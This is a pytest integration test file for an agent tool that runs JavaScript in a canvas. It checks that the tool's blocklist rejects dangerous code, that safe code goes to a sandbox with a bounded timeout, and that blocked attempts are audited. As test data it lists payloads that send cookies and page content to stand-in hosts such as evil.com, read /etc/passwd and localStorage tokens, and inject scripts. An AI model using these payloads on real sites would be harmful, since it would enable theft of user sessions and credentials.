"""
Canvas JavaScript security integration tests (INTG-13).

Tests cover:
- JavaScript sandboxing
- JavaScript validation
- Dangerous JavaScript blocking

Ported to the current architecture: canvas JavaScript execution is no longer
an HTTP endpoint (`POST /api/canvas/{id}/execute` was removed). The execution
surface is the agent tool ``tools.canvas_tool.canvas_execute_javascript``,
which gates on governance (AUTONOMOUS only), screens the code against a
dangerous-pattern blocklist, and relays the payload to the user's browser
sandbox over WebSocket with a bounded timeout.
"""
import asyncio
import uuid
from unittest.mock import AsyncMock, Mock, patch

import pytest
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session
from tests.factories.agent_factory import AutonomousAgentFactory
from core.models import CanvasAudit, AgentExecution
from tools.canvas_tool import canvas_execute_javascript


# Malicious JavaScript payloads
MALICIOUS_JS_PATTERNS = [
    # Fetch exfiltration
    "fetch('https://evil.com/steal?data='+document.cookie)",
    "fetch('http://attacker.com/log', {body: document.body.innerHTML})",

    # eval() execution
    "eval(atob('YWxlcnQoJ1hTUycp'))",
    "eval(userInput)",

    # Document cookie access
    "document.cookie",
    "document['cookie']",

    # window.location manipulation
    "window.location='https://evil.com'",
    "window.location.href = 'https://phishing.com'",

    # postMessage exfiltration
    "window.postMessage(document.cookie, '*')",

    # localStorage/sessionStorage access
    "localStorage.getItem('token')",
    "sessionStorage['password']",

    # DOM manipulation
    "document.body.innerHTML = xhr.responseText",
    'document.write("<script>alert(1)</script>")',

    # Dynamic script creation
    "var s = document.createElement('script'); s.src = 'evil.js'; document.head.appendChild(s)",
]

SAFE_JS_PATTERNS = [
    "console.log('debug');",
    "const x = 5;",
    "function add(a, b) { return a + b; }",
    "document.querySelector('.test');",
    "element.classList.add('active');",
    "Array.from(items).map(x => x.id);",
]


def _execute(client: TestClient, auth_token: str, db_session: Session,
             javascript: str, agent, canvas_id: str = None):
    """Run the real canvas_execute_javascript tool against the test DB."""
    canvas_id = canvas_id or str(uuid.uuid4())
    result = asyncio.run(canvas_execute_javascript(
        user_id="integration-test-user",
        canvas_id=canvas_id,
        javascript=javascript,
        agent_id=agent.id,
    ))
    return canvas_id, result


@pytest.fixture
def autonomous_agent(db_session: Session):
    """Committed AUTONOMOUS agent visible to the tool's own DB session."""
    agent = AutonomousAgentFactory(_session=db_session)
    db_session.commit()
    return agent


class TestJavaScriptSandboxing:
    """Test JavaScript execution sandboxing."""

    def test_javascript_execution_isolated(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test JavaScript execution is isolated from main process.

        The server-side guard must reject Node-style process access before
        anything is relayed to the client sandbox.
        """
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "process.exit(1)", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_javascript_no_filesystem_access(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test JavaScript cannot access filesystem."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "require('fs').readFileSync('/etc/passwd')", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_javascript_no_network_access(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test JavaScript cannot make network requests."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "fetch('https://evil.com/steal')", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_javascript_execution_timeout(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test JavaScript execution has a bounded timeout.

        Infinite loops are a client-sandbox concern; the server must relay the
        execution with a finite timeout_ms so the sandbox can kill it.
        """
        mock_ws = Mock()
        mock_ws.broadcast = AsyncMock()

        with patch('tools.canvas_tool.ws_manager', mock_ws):
            canvas_id, result = _execute(
                client, auth_token, db_session,
                "while(true) {}", autonomous_agent,
            )

        assert result["success"] is True

        # The relayed execution request must carry a finite timeout
        mock_ws.broadcast.assert_called_once()
        channel, message = mock_ws.broadcast.call_args[0]
        assert channel == "user:integration-test-user"
        assert message["type"] == "canvas:execute"
        assert message["data"]["action"] == "execute_javascript"
        assert 0 < message["data"]["timeout_ms"] <= 30000


class TestJavaScriptValidation:
    """Test JavaScript code validation."""

    def test_validate_safe_javascript(self, client: TestClient, auth_token: str, db_session: Session):
        """Test validation allows safe JavaScript."""
        canvas_id = str(uuid.uuid4())

        response = client.post(
            f"/api/canvas/{canvas_id}/validate",
            json={
                "javascript": "console.log('safe code');"
            },
            headers={"Authorization": f"Bearer {auth_token}"}
        )

        # Validation endpoint may not exist
        if response.status_code == 200:
            data = response.json()
            assert data.get("valid") is True
        else:
            assert response.status_code == 404

    def test_validate_dangerous_apis(self, client: TestClient, auth_token: str, db_session: Session):
        """Test validation detects dangerous APIs."""
        canvas_id = str(uuid.uuid4())

        dangerous_apis = [
            "eval(userInput)",
            "Function('return code')",
            "document.write(malicious)",
            "window.location = 'https://evil.com'",
            "document.cookie",
            "localStorage.getItem('token')",
        ]

        for api in dangerous_apis:
            response = client.post(
                f"/api/canvas/{canvas_id}/validate",
                json={"javascript": api},
                headers={"Authorization": f"Bearer {auth_token}"}
            )

            if response.status_code == 200:
                data = response.json()
                # Should flag as dangerous
                assert data.get("valid") is False or "dangerous" in str(data).lower()

    @pytest.mark.parametrize("safe_code", SAFE_JS_PATTERNS)
    def test_safe_patterns_allowed(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent, safe_code):
        """Test safe JavaScript patterns are allowed through the tool."""
        canvas_id, result = _execute(
            client, auth_token, db_session, safe_code, autonomous_agent,
        )

        assert result["success"] is True
        assert result["javascript_length"] == len(safe_code)


class TestDangerousJavaScriptBlocking:
    """Test blocking of dangerous JavaScript patterns."""

    @pytest.mark.parametrize("malicious_code", MALICIOUS_JS_PATTERNS)
    def test_malicious_patterns_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent, malicious_code):
        """Test malicious JavaScript patterns are blocked."""
        canvas_id, result = _execute(
            client, auth_token, db_session, malicious_code, autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_eval_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test eval() is blocked."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "eval('alert(1)')", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_function_constructor_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test Function() constructor is blocked."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "new Function('return malicious')()", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]

    def test_dom_manipulation_blocked(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test dangerous DOM manipulation is blocked."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "document.body.innerHTML = '<script>alert(1)</script>'", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]


class TestJavaScriptContentSecurityPolicy:
    """Test the server-side equivalent of the CSP contract: code is relayed
    as data to the user's isolated channel, never executed server-side, and
    inline script injection is rejected outright."""

    def test_csp_restrictions(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test safe code is relayed sandboxed: isolated user channel + bounded timeout."""
        mock_ws = Mock()
        mock_ws.broadcast = AsyncMock()

        with patch('tools.canvas_tool.ws_manager', mock_ws):
            canvas_id, result = _execute(
                client, auth_token, db_session,
                "console.log('test');", autonomous_agent,
            )

        assert result["success"] is True

        mock_ws.broadcast.assert_called_once()
        channel, message = mock_ws.broadcast.call_args[0]
        # Execution is scoped to the owning user's channel only
        assert channel == "user:integration-test-user"
        assert message["data"]["canvas_id"] == canvas_id
        # Bounded execution window for the client sandbox
        assert 0 < message["data"]["timeout_ms"] <= 30000

    def test_inline_script_blocking(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test inline script injection is blocked."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "<script>alert('inline')</script>", autonomous_agent,
        )

        assert result["success"] is False
        assert "dangerous pattern" in result["error"]


class TestJavaScriptAuditLogging:
    """Test JavaScript security audit logging."""

    def test_malicious_javascript_logged(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test malicious JavaScript attempts are logged in the audit trail."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "eval(malicious)", autonomous_agent,
        )

        assert result["success"] is False

        # Should log security event
        audits = db_session.query(CanvasAudit).filter(
            CanvasAudit.canvas_id == canvas_id,
            CanvasAudit.agent_id == autonomous_agent.id,
        ).all()

        # Should have audit record for the security event
        assert len(audits) >= 1

    def test_security_violation_metadata(self, client: TestClient, auth_token: str, db_session: Session, autonomous_agent):
        """Test security violations include metadata."""
        canvas_id, result = _execute(
            client, auth_token, db_session,
            "fetch('https://evil.com')", autonomous_agent,
        )

        assert result["success"] is False

        # Check audit metadata includes security details
        audits = db_session.query(CanvasAudit).filter(
            CanvasAudit.canvas_id == canvas_id,
            CanvasAudit.agent_id == autonomous_agent.id,
        ).all()

        assert len(audits) >= 1
        details = audits[0].details_json or {}
        assert isinstance(details, dict)
        # Should include security violation details
        assert details.get("blocked") is True
        assert details.get("security_violation")
        assert details.get("governance_check_passed") is False

        # The linked execution must be failed, not left dangling as running
        execution_id = details.get("agent_execution_id")
        if execution_id:
            execution = db_session.query(AgentExecution).filter(
                AgentExecution.id == execution_id
            ).first()
            assert execution is not None
            assert execution.status == "failed"
            assert execution.error_message is not None
